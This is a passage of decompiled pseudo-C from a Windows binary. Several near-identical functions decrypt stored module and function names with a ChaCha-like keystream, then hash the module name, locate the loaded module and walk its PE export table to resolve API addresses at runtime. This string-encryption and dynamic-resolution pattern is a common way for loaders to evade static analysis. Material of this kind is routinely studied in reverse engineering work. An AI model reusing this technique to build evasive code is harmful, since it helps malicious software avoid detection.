    uVar16 = uVar16 << 7 | uVar16 >> 0x19;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 0x10 | uVar7 >> 0x10;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 0xc | uVar16 >> 0x14;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 8 | uVar7 >> 0x18;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 7 | uVar16 >> 0x19;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 0x10 | uVar7 >> 0x10;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 0xc | uVar16 >> 0x14;
    uVar15 = uVar16 + uVar15;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 8 | uVar7 >> 0x18;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    local_f8[uVar11] =
         (byte)(((uVar16 << 7 | uVar16 >> 0x19) ^ uVar7 ^ uVar6 ^ uVar15) >>
               (((byte)uVar11 & 3) << 3)) ^ *(byte *)(param_1 + uVar11);
    uVar11 = uVar11 + 1;
  } while (uVar11 < 0xd);
  uVar13 = *(uint *)(param_2 + 0x10);
  uVar11 = 0;
  local_f8[0x40] = 0;
  local_f8[0x41] = 0;
  local_f8[0x42] = 0;
  local_f8[0x43] = 0;
  local_f8[0x44] = 0;
  local_f8[0x45] = 0;
  local_f8[0x46] = 0;
  local_f8[0x47] = 0;
  local_f8[0x48] = 0;
  local_f8[0x49] = 0;
  local_f8[0x4a] = 0;
  local_f8[0x4b] = 0;
  local_f8[0x4c] = 0;
  local_f8[0x4d] = 0;
  local_f8[0x4e] = 0;
  local_f8[0x4f] = 0;
  local_f8[0x50] = 0;
  local_f8[0x51] = 0;
  local_f8[0x52] = 0;
  local_f8[0x53] = 0;
  local_f8[0x54] = 0;
  local_f8[0x55] = 0;
  local_f8[0x56] = 0;
  local_f8[0x57] = 0;
  local_f8[0x58] = 0;
  local_f8[0x59] = 0;
  local_f8[0x5a] = 0;
  local_f8[0x5b] = 0;
  local_f8[0x5c] = 0;
  local_f8[0x5d] = 0;
  local_f8[0x5e] = 0;
  local_f8[0x5f] = 0;
  uVar9 = (uVar13 ^ 0x271f43d9) * -0x61c88647 ^ 0xcafebabe;
  local_f8[0x60] = 0;
  local_f8[0x61] = 0;
  local_f8[0x62] = 0;
  local_f8[99] = 0;
  local_f8[100] = 0;
  local_f8[0x65] = 0;
  local_f8[0x66] = 0;
  local_f8[0x67] = 0;
  local_f8[0x68] = 0;
  local_f8[0x69] = 0;
  local_f8[0x6a] = 0;
  local_f8[0x6b] = 0;
  local_f8[0x6c] = 0;
  local_f8[0x6d] = 0;
  local_f8[0x6e] = 0;
  local_f8[0x6f] = 0;
  local_f8[0x70] = 0;
  local_f8[0x71] = 0;
  local_f8[0x72] = 0;
  local_f8[0x73] = 0;
  local_f8[0x74] = 0;
  local_f8[0x75] = 0;
  local_f8[0x76] = 0;
  local_f8[0x77] = 0;
  local_f8[0x78] = 0;
  local_f8[0x79] = 0;
  local_f8[0x7a] = 0;
  local_f8[0x7b] = 0;
  local_f8[0x7c] = 0;
  local_f8[0x7d] = 0;
  local_f8[0x7e] = 0;
  local_f8[0x7f] = 0;
  uVar12 = (uVar13 ^ 0x64d7cf8) + uVar9;
  local_f8[0x80] = 0;
  local_f8[0x81] = 0;
  local_f8[0x82] = 0;
  local_f8[0x83] = 0;
  local_f8[0x84] = 0;
  local_f8[0x85] = 0;
  local_f8[0x86] = 0;
  local_f8[0x87] = 0;
  local_f8[0x88] = 0;
  local_f8[0x89] = 0;
  local_f8[0x8a] = 0;
  local_f8[0x8b] = 0;
  local_f8[0x8c] = 0;
  local_f8[0x8d] = 0;
  local_f8[0x8e] = 0;
  local_f8[0x8f] = 0;
  local_f8[0x90] = 0;
  local_f8[0x91] = 0;
  local_f8[0x92] = 0;
  local_f8[0x93] = 0;
  local_f8[0x94] = 0;
  local_f8[0x95] = 0;
  local_f8[0x96] = 0;
  local_f8[0x97] = 0;
  local_f8[0x98] = 0;
  local_f8[0x99] = 0;
  local_f8[0x9a] = 0;
  local_f8[0x9b] = 0;
  local_f8[0x9c] = 0;
  local_f8[0x9d] = 0;
  local_f8[0x9e] = 0;
  local_f8[0x9f] = 0;
  local_f8[0xa0] = 0;
  local_f8[0xa1] = 0;
  local_f8[0xa2] = 0;
  local_f8[0xa3] = 0;
  local_f8[0xa4] = 0;
  local_f8[0xa5] = 0;
  local_f8[0xa6] = 0;
  local_f8[0xa7] = 0;
  local_f8[0xa8] = 0;
  local_f8[0xa9] = 0;
  local_f8[0xaa] = 0;
  local_f8[0xab] = 0;
  local_f8[0xac] = 0;
  local_f8[0xad] = 0;
  local_f8[0xae] = 0;
  local_f8[0xaf] = 0;
  local_f8[0xb0] = 0;
  local_f8[0xb1] = 0;
  local_f8[0xb2] = 0;
  local_f8[0xb3] = 0;
  local_f8[0xb4] = 0;
  local_f8[0xb5] = 0;
  local_f8[0xb6] = 0;
  local_f8[0xb7] = 0;
  local_f8[0xb8] = 0;
  local_f8[0xb9] = 0;
  local_f8[0xba] = 0;
  local_f8[0xbb] = 0;
  local_f8[0xbc] = 0;
  local_f8[0xbd] = 0;
  local_f8[0xbe] = 0;
  local_f8[0xbf] = 0;
  do {
    uVar6 = (uint)uVar11 ^ uVar12 ^ 0x99f0b3d4;
    uVar7 = uVar6 << 0x10 | uVar6 >> 0x10;
    uVar6 = uVar7 + ((uVar13 >> 0x13 | uVar13 << 0xd) ^ 0x13371337);
    uVar15 = uVar6 ^ uVar9;
    uVar16 = uVar15 << 0xc | uVar15 >> 0x14;
    uVar15 = uVar16 + uVar12;
    uVar7 = uVar15 ^ uVar7;
    uVar7 = uVar7 << 8 | uVar7 >> 0x18;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 7 | uVar16 >> 0x19;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 0x10 | uVar7 >> 0x10;
    uVar6 = uVar7 + uVar6;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 0xc | uVar16 >> 0x14;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 8 | uVar7 >> 0x18;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 7 | uVar16 >> 0x19;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 0x10 | uVar7 >> 0x10;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 0xc | uVar16 >> 0x14;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 8 | uVar7 >> 0x18;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 7 | uVar16 >> 0x19;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 0x10 | uVar7 >> 0x10;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 0xc | uVar16 >> 0x14;
    uVar15 = uVar16 + uVar15;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 8 | uVar7 >> 0x18;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    local_f8[uVar11 + 0x40] =
         (byte)(((uVar16 << 7 | uVar16 >> 0x19) ^ uVar7 ^ uVar6 ^ uVar15) >>
               (((byte)uVar11 & 3) << 3)) ^ *(byte *)(uVar11 + param_2);
    uVar11 = uVar11 + 1;
  } while (uVar11 < 0xd);
  lVar10 = 0;
  uVar12 = 0x1505;
  bVar2 = local_f8[0];
  for (uVar11 = 0; (bVar2 != 0 && (uVar11 < 0x3f)); uVar11 = uVar11 + 1) {
    uVar12 = (local_f8[uVar11] | 0x20) ^ uVar12 * 0x21;
    bVar2 = local_f8[uVar11 + 1];
  }
  psVar3 = (short *)FUN_140001950(uVar12);
  if (((psVar3 != (short *)0x0) && (*psVar3 == 0x5a4d)) &&
     (uVar12 = *(uint *)((longlong)*(int *)(psVar3 + 0x1e) + 0x88 + (longlong)psVar3),
     uVar11 = (ulonglong)uVar12, uVar12 != 0)) {
    uVar12 = *(uint *)((longlong)psVar3 + uVar11 + 0x18);
    uVar14 = 0;
    if (uVar12 != 0) {
      do {
        pbVar8 = local_f8 + 0x40;
        pbVar4 = (byte *)((ulonglong)
                          *(uint *)((longlong)psVar3 +
                                   uVar14 * 4 +
                                   (ulonglong)*(uint *)((longlong)psVar3 + uVar11 + 0x20)) +
                         (longlong)psVar3);
        bVar2 = *pbVar4;
        while ((bVar2 != 0 && (bVar2 == *pbVar8))) {
          pbVar1 = pbVar4 + 1;
          pbVar4 = pbVar4 + 1;
          pbVar8 = pbVar8 + 1;
          bVar2 = *pbVar1;
        }
        if (*pbVar4 == *pbVar8) {
          lVar10 = (ulonglong)
                   *(uint *)((longlong)psVar3 +
                            (ulonglong)
                            *(ushort *)
                             ((longlong)psVar3 +
                             uVar14 * 2 + (ulonglong)*(uint *)((longlong)psVar3 + uVar11 + 0x24)) *
                            4 + (ulonglong)*(uint *)((longlong)psVar3 + uVar11 + 0x1c)) +
                   (longlong)psVar3;
          goto LAB_140007256;
        }
        uVar13 = (int)uVar14 + 1;
        uVar14 = (ulonglong)uVar13;
      } while (uVar13 < uVar12);
    }
    lVar10 = 0;
  }
LAB_140007256:
  lVar5 = 0;
  do {
    local_f8[lVar5] = 0;
    lVar5 = lVar5 + 1;
  } while (lVar5 != 0x40);
  lVar5 = 0;
  do {
    local_f8[lVar5 + 0x40] = 0;
    lVar5 = lVar5 + 1;
  } while (lVar5 != 0x80);
  return lVar10;
}


// ==== FUN_1400072c0 @ 1400072c0 size 955

/* WARNING: Function: __security_check_cookie replaced with injection: security_check_cookie */

longlong FUN_1400072c0(longlong param_1,longlong param_2)

{
  byte *pbVar1;
  byte bVar2;
  short *psVar3;
  byte *pbVar4;
  longlong lVar5;
  uint uVar6;
  uint uVar7;
  byte *pbVar8;
  uint uVar9;
  longlong lVar10;
  ulonglong uVar11;
  uint uVar12;
  uint uVar13;
  ulonglong uVar14;
  uint uVar15;
  uint uVar16;
  undefined1 auStack_118 [32];
  byte local_f8 [192];
  ulonglong local_38;
  
  local_38 = DAT_140010000 ^ (ulonglong)auStack_118;
  uVar13 = *(uint *)(param_1 + 0x10);
  uVar11 = 0;
  local_f8[0] = 0;
  local_f8[1] = 0;
  local_f8[2] = 0;
  local_f8[3] = 0;
  local_f8[4] = 0;
  local_f8[5] = 0;
  local_f8[6] = 0;
  local_f8[7] = 0;
  local_f8[8] = 0;
  local_f8[9] = 0;
  local_f8[10] = 0;
  local_f8[0xb] = 0;
  local_f8[0xc] = 0;
  local_f8[0xd] = 0;
  local_f8[0xe] = 0;
  local_f8[0xf] = 0;
  uVar9 = (uVar13 ^ 0x271f43d9) * -0x61c88647 ^ 0xcafebabe;
  local_f8[0x10] = 0;
  local_f8[0x11] = 0;
  local_f8[0x12] = 0;
  local_f8[0x13] = 0;
  local_f8[0x14] = 0;
  local_f8[0x15] = 0;
  local_f8[0x16] = 0;
  local_f8[0x17] = 0;
  local_f8[0x18] = 0;
  local_f8[0x19] = 0;
  local_f8[0x1a] = 0;
  local_f8[0x1b] = 0;
  local_f8[0x1c] = 0;
  local_f8[0x1d] = 0;
  local_f8[0x1e] = 0;
  local_f8[0x1f] = 0;
  local_f8[0x20] = 0;
  local_f8[0x21] = 0;
  local_f8[0x22] = 0;
  local_f8[0x23] = 0;
  local_f8[0x24] = 0;
  local_f8[0x25] = 0;
  local_f8[0x26] = 0;
  local_f8[0x27] = 0;
  local_f8[0x28] = 0;
  local_f8[0x29] = 0;
  local_f8[0x2a] = 0;
  local_f8[0x2b] = 0;
  local_f8[0x2c] = 0;
  local_f8[0x2d] = 0;
  local_f8[0x2e] = 0;
  local_f8[0x2f] = 0;
  uVar12 = (uVar13 ^ 0x64d7cf8) + uVar9;
  local_f8[0x30] = 0;
  local_f8[0x31] = 0;
  local_f8[0x32] = 0;
  local_f8[0x33] = 0;
  local_f8[0x34] = 0;
  local_f8[0x35] = 0;
  local_f8[0x36] = 0;
  local_f8[0x37] = 0;
  local_f8[0x38] = 0;
  local_f8[0x39] = 0;
  local_f8[0x3a] = 0;
  local_f8[0x3b] = 0;
  local_f8[0x3c] = 0;
  local_f8[0x3d] = 0;
  local_f8[0x3e] = 0;
  local_f8[0x3f] = 0;
  do {
    uVar6 = (uint)uVar11 ^ uVar12 ^ 0x99f0b3d4;
    uVar7 = uVar6 << 0x10 | uVar6 >> 0x10;
    uVar6 = uVar7 + ((uVar13 >> 0x13 | uVar13 << 0xd) ^ 0x13371337);
    uVar15 = uVar6 ^ uVar9;
    uVar16 = uVar15 << 0xc | uVar15 >> 0x14;
    uVar15 = uVar16 + uVar12;
    uVar7 = uVar15 ^ uVar7;
    uVar7 = uVar7 << 8 | uVar7 >> 0x18;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 7 | uVar16 >> 0x19;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 0x10 | uVar7 >> 0x10;
    uVar6 = uVar7 + uVar6;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 0xc | uVar16 >> 0x14;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 8 | uVar7 >> 0x18;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 7 | uVar16 >> 0x19;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 0x10 | uVar7 >> 0x10;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 0xc | uVar16 >> 0x14;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 8 | uVar7 >> 0x18;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 7 | uVar16 >> 0x19;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 0x10 | uVar7 >> 0x10;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 0xc | uVar16 >> 0x14;
    uVar15 = uVar16 + uVar15;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 8 | uVar7 >> 0x18;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    local_f8[uVar11] =
         (byte)(((uVar16 << 7 | uVar16 >> 0x19) ^ uVar7 ^ uVar6 ^ uVar15) >>
               (((byte)uVar11 & 3) << 3)) ^ *(byte *)(param_1 + uVar11);
    uVar11 = uVar11 + 1;
  } while (uVar11 < 0xd);
  uVar13 = *(uint *)(param_2 + 0x10);
  uVar11 = 0;
  local_f8[0x40] = 0;
  local_f8[0x41] = 0;
  local_f8[0x42] = 0;
  local_f8[0x43] = 0;
  local_f8[0x44] = 0;
  local_f8[0x45] = 0;
  local_f8[0x46] = 0;
  local_f8[0x47] = 0;
  local_f8[0x48] = 0;
  local_f8[0x49] = 0;
  local_f8[0x4a] = 0;
  local_f8[0x4b] = 0;
  local_f8[0x4c] = 0;
  local_f8[0x4d] = 0;
  local_f8[0x4e] = 0;
  local_f8[0x4f] = 0;
  local_f8[0x50] = 0;
  local_f8[0x51] = 0;
  local_f8[0x52] = 0;
  local_f8[0x53] = 0;
  local_f8[0x54] = 0;
  local_f8[0x55] = 0;
  local_f8[0x56] = 0;
  local_f8[0x57] = 0;
  local_f8[0x58] = 0;
  local_f8[0x59] = 0;
  local_f8[0x5a] = 0;
  local_f8[0x5b] = 0;
  local_f8[0x5c] = 0;
  local_f8[0x5d] = 0;
  local_f8[0x5e] = 0;
  local_f8[0x5f] = 0;
  uVar9 = (uVar13 ^ 0x271f43d9) * -0x61c88647 ^ 0xcafebabe;
  local_f8[0x60] = 0;
  local_f8[0x61] = 0;
  local_f8[0x62] = 0;
  local_f8[99] = 0;
  local_f8[100] = 0;
  local_f8[0x65] = 0;
  local_f8[0x66] = 0;
  local_f8[0x67] = 0;
  local_f8[0x68] = 0;
  local_f8[0x69] = 0;
  local_f8[0x6a] = 0;
  local_f8[0x6b] = 0;
  local_f8[0x6c] = 0;
  local_f8[0x6d] = 0;
  local_f8[0x6e] = 0;
  local_f8[0x6f] = 0;
  local_f8[0x70] = 0;
  local_f8[0x71] = 0;
  local_f8[0x72] = 0;
  local_f8[0x73] = 0;
  local_f8[0x74] = 0;
  local_f8[0x75] = 0;
  local_f8[0x76] = 0;
  local_f8[0x77] = 0;
  local_f8[0x78] = 0;
  local_f8[0x79] = 0;
  local_f8[0x7a] = 0;
  local_f8[0x7b] = 0;
  local_f8[0x7c] = 0;
  local_f8[0x7d] = 0;
  local_f8[0x7e] = 0;
  local_f8[0x7f] = 0;
  uVar12 = (uVar13 ^ 0x64d7cf8) + uVar9;
  local_f8[0x80] = 0;
  local_f8[0x81] = 0;
  local_f8[0x82] = 0;
  local_f8[0x83] = 0;
  local_f8[0x84] = 0;
  local_f8[0x85] = 0;
  local_f8[0x86] = 0;
  local_f8[0x87] = 0;
  local_f8[0x88] = 0;
  local_f8[0x89] = 0;
  local_f8[0x8a] = 0;
  local_f8[0x8b] = 0;
  local_f8[0x8c] = 0;
  local_f8[0x8d] = 0;
  local_f8[0x8e] = 0;
  local_f8[0x8f] = 0;
  local_f8[0x90] = 0;
  local_f8[0x91] = 0;
  local_f8[0x92] = 0;
  local_f8[0x93] = 0;
  local_f8[0x94] = 0;
  local_f8[0x95] = 0;
  local_f8[0x96] = 0;
  local_f8[0x97] = 0;
  local_f8[0x98] = 0;
  local_f8[0x99] = 0;
  local_f8[0x9a] = 0;
  local_f8[0x9b] = 0;
  local_f8[0x9c] = 0;
  local_f8[0x9d] = 0;
  local_f8[0x9e] = 0;
  local_f8[0x9f] = 0;
  local_f8[0xa0] = 0;
  local_f8[0xa1] = 0;
  local_f8[0xa2] = 0;
  local_f8[0xa3] = 0;
  local_f8[0xa4] = 0;
  local_f8[0xa5] = 0;
  local_f8[0xa6] = 0;
  local_f8[0xa7] = 0;
  local_f8[0xa8] = 0;
  local_f8[0xa9] = 0;
  local_f8[0xaa] = 0;
  local_f8[0xab] = 0;
  local_f8[0xac] = 0;
  local_f8[0xad] = 0;
  local_f8[0xae] = 0;
  local_f8[0xaf] = 0;
  local_f8[0xb0] = 0;
  local_f8[0xb1] = 0;
  local_f8[0xb2] = 0;
  local_f8[0xb3] = 0;
  local_f8[0xb4] = 0;
  local_f8[0xb5] = 0;
  local_f8[0xb6] = 0;
  local_f8[0xb7] = 0;
  local_f8[0xb8] = 0;
  local_f8[0xb9] = 0;
  local_f8[0xba] = 0;
  local_f8[0xbb] = 0;
  local_f8[0xbc] = 0;
  local_f8[0xbd] = 0;
  local_f8[0xbe] = 0;
  local_f8[0xbf] = 0;
  do {
    uVar6 = (uint)uVar11 ^ uVar12 ^ 0x99f0b3d4;
    uVar7 = uVar6 << 0x10 | uVar6 >> 0x10;
    uVar6 = uVar7 + ((uVar13 >> 0x13 | uVar13 << 0xd) ^ 0x13371337);
    uVar15 = uVar6 ^ uVar9;
    uVar16 = uVar15 << 0xc | uVar15 >> 0x14;
    uVar15 = uVar16 + uVar12;
    uVar7 = uVar15 ^ uVar7;
    uVar7 = uVar7 << 8 | uVar7 >> 0x18;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 7 | uVar16 >> 0x19;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 0x10 | uVar7 >> 0x10;
    uVar6 = uVar7 + uVar6;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 0xc | uVar16 >> 0x14;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 8 | uVar7 >> 0x18;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 7 | uVar16 >> 0x19;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 0x10 | uVar7 >> 0x10;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 0xc | uVar16 >> 0x14;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 8 | uVar7 >> 0x18;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 7 | uVar16 >> 0x19;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 0x10 | uVar7 >> 0x10;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 0xc | uVar16 >> 0x14;
    uVar15 = uVar16 + uVar15;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 8 | uVar7 >> 0x18;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    local_f8[uVar11 + 0x40] =
         (byte)(((uVar16 << 7 | uVar16 >> 0x19) ^ uVar7 ^ uVar6 ^ uVar15) >>
               (((byte)uVar11 & 3) << 3)) ^ *(byte *)(uVar11 + param_2);
    uVar11 = uVar11 + 1;
  } while (uVar11 < 0xf);
  lVar10 = 0;
  uVar12 = 0x1505;
  bVar2 = local_f8[0];
  for (uVar11 = 0; (bVar2 != 0 && (uVar11 < 0x3f)); uVar11 = uVar11 + 1) {
    uVar12 = (local_f8[uVar11] | 0x20) ^ uVar12 * 0x21;
    bVar2 = local_f8[uVar11 + 1];
  }
  psVar3 = (short *)FUN_140001950(uVar12);
  if (((psVar3 != (short *)0x0) && (*psVar3 == 0x5a4d)) &&
     (uVar12 = *(uint *)((longlong)*(int *)(psVar3 + 0x1e) + 0x88 + (longlong)psVar3),
     uVar11 = (ulonglong)uVar12, uVar12 != 0)) {
    uVar12 = *(uint *)((longlong)psVar3 + uVar11 + 0x18);
    uVar14 = 0;
    if (uVar12 != 0) {
      do {
        pbVar8 = local_f8 + 0x40;
        pbVar4 = (byte *)((ulonglong)
                          *(uint *)((longlong)psVar3 +
                                   uVar14 * 4 +
                                   (ulonglong)*(uint *)((longlong)psVar3 + uVar11 + 0x20)) +
                         (longlong)psVar3);
        bVar2 = *pbVar4;
        while ((bVar2 != 0 && (bVar2 == *pbVar8))) {
          pbVar1 = pbVar4 + 1;
          pbVar4 = pbVar4 + 1;
          pbVar8 = pbVar8 + 1;
          bVar2 = *pbVar1;
        }
        if (*pbVar4 == *pbVar8) {
          lVar10 = (ulonglong)
                   *(uint *)((longlong)psVar3 +
                            (ulonglong)
                            *(ushort *)
                             ((longlong)psVar3 +
                             uVar14 * 2 + (ulonglong)*(uint *)((longlong)psVar3 + uVar11 + 0x24)) *
                            4 + (ulonglong)*(uint *)((longlong)psVar3 + uVar11 + 0x1c)) +
                   (longlong)psVar3;
          goto LAB_140007616;
        }
        uVar13 = (int)uVar14 + 1;
        uVar14 = (ulonglong)uVar13;
      } while (uVar13 < uVar12);
    }
    lVar10 = 0;
  }
LAB_140007616:
  lVar5 = 0;
  do {
    local_f8[lVar5] = 0;
    lVar5 = lVar5 + 1;
  } while (lVar5 != 0x40);
  lVar5 = 0;
  do {
    local_f8[lVar5 + 0x40] = 0;
    lVar5 = lVar5 + 1;
  } while (lVar5 != 0x80);
  return lVar10;
}


// ==== FUN_140007680 @ 140007680 size 955

/* WARNING: Function: __security_check_cookie replaced with injection: security_check_cookie */

longlong FUN_140007680(longlong param_1,longlong param_2)

{
  byte *pbVar1;
  byte bVar2;
  short *psVar3;
  byte *pbVar4;
  longlong lVar5;
  uint uVar6;
  uint uVar7;
  byte *pbVar8;
  uint uVar9;
  longlong lVar10;
  ulonglong uVar11;
  uint uVar12;
  uint uVar13;
  ulonglong uVar14;
  uint uVar15;
  uint uVar16;
  undefined1 auStack_118 [32];
  byte local_f8 [192];
  ulonglong local_38;
  
  local_38 = DAT_140010000 ^ (ulonglong)auStack_118;
  uVar13 = *(uint *)(param_1 + 0x10);
  uVar11 = 0;
  local_f8[0] = 0;
  local_f8[1] = 0;
  local_f8[2] = 0;
  local_f8[3] = 0;
  local_f8[4] = 0;
  local_f8[5] = 0;
  local_f8[6] = 0;
  local_f8[7] = 0;
  local_f8[8] = 0;
  local_f8[9] = 0;
  local_f8[10] = 0;
  local_f8[0xb] = 0;
  local_f8[0xc] = 0;
  local_f8[0xd] = 0;
  local_f8[0xe] = 0;
  local_f8[0xf] = 0;
  uVar9 = (uVar13 ^ 0x271f43d9) * -0x61c88647 ^ 0xcafebabe;
  local_f8[0x10] = 0;
  local_f8[0x11] = 0;
  local_f8[0x12] = 0;
  local_f8[0x13] = 0;
  local_f8[0x14] = 0;
  local_f8[0x15] = 0;
  local_f8[0x16] = 0;
  local_f8[0x17] = 0;
  local_f8[0x18] = 0;
  local_f8[0x19] = 0;
  local_f8[0x1a] = 0;
  local_f8[0x1b] = 0;
  local_f8[0x1c] = 0;
  local_f8[0x1d] = 0;
  local_f8[0x1e] = 0;
  local_f8[0x1f] = 0;
  local_f8[0x20] = 0;
  local_f8[0x21] = 0;
  local_f8[0x22] = 0;
  local_f8[0x23] = 0;
  local_f8[0x24] = 0;
  local_f8[0x25] = 0;
  local_f8[0x26] = 0;
  local_f8[0x27] = 0;
  local_f8[0x28] = 0;
  local_f8[0x29] = 0;
  local_f8[0x2a] = 0;
  local_f8[0x2b] = 0;
  local_f8[0x2c] = 0;
  local_f8[0x2d] = 0;
  local_f8[0x2e] = 0;
  local_f8[0x2f] = 0;
  uVar12 = (uVar13 ^ 0x64d7cf8) + uVar9;
  local_f8[0x30] = 0;
  local_f8[0x31] = 0;
  local_f8[0x32] = 0;
  local_f8[0x33] = 0;
  local_f8[0x34] = 0;
  local_f8[0x35] = 0;
  local_f8[0x36] = 0;
  local_f8[0x37] = 0;
  local_f8[0x38] = 0;
  local_f8[0x39] = 0;
  local_f8[0x3a] = 0;
  local_f8[0x3b] = 0;
  local_f8[0x3c] = 0;
  local_f8[0x3d] = 0;
  local_f8[0x3e] = 0;
  local_f8[0x3f] = 0;
  do {
    uVar6 = (uint)uVar11 ^ uVar12 ^ 0x99f0b3d4;
    uVar7 = uVar6 << 0x10 | uVar6 >> 0x10;
    uVar6 = uVar7 + ((uVar13 >> 0x13 | uVar13 << 0xd) ^ 0x13371337);
    uVar15 = uVar6 ^ uVar9;
    uVar16 = uVar15 << 0xc | uVar15 >> 0x14;
    uVar15 = uVar16 + uVar12;
    uVar7 = uVar15 ^ uVar7;
    uVar7 = uVar7 << 8 | uVar7 >> 0x18;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 7 | uVar16 >> 0x19;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 0x10 | uVar7 >> 0x10;
    uVar6 = uVar7 + uVar6;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 0xc | uVar16 >> 0x14;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 8 | uVar7 >> 0x18;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 7 | uVar16 >> 0x19;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 0x10 | uVar7 >> 0x10;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 0xc | uVar16 >> 0x14;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 8 | uVar7 >> 0x18;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 7 | uVar16 >> 0x19;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 0x10 | uVar7 >> 0x10;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 0xc | uVar16 >> 0x14;
    uVar15 = uVar16 + uVar15;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 8 | uVar7 >> 0x18;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    local_f8[uVar11] =
         (byte)(((uVar16 << 7 | uVar16 >> 0x19) ^ uVar7 ^ uVar6 ^ uVar15) >>
               (((byte)uVar11 & 3) << 3)) ^ *(byte *)(param_1 + uVar11);
    uVar11 = uVar11 + 1;
  } while (uVar11 < 0xd);
  uVar13 = *(uint *)(param_2 + 0xc);
  uVar11 = 0;
  local_f8[0x40] = 0;
  local_f8[0x41] = 0;
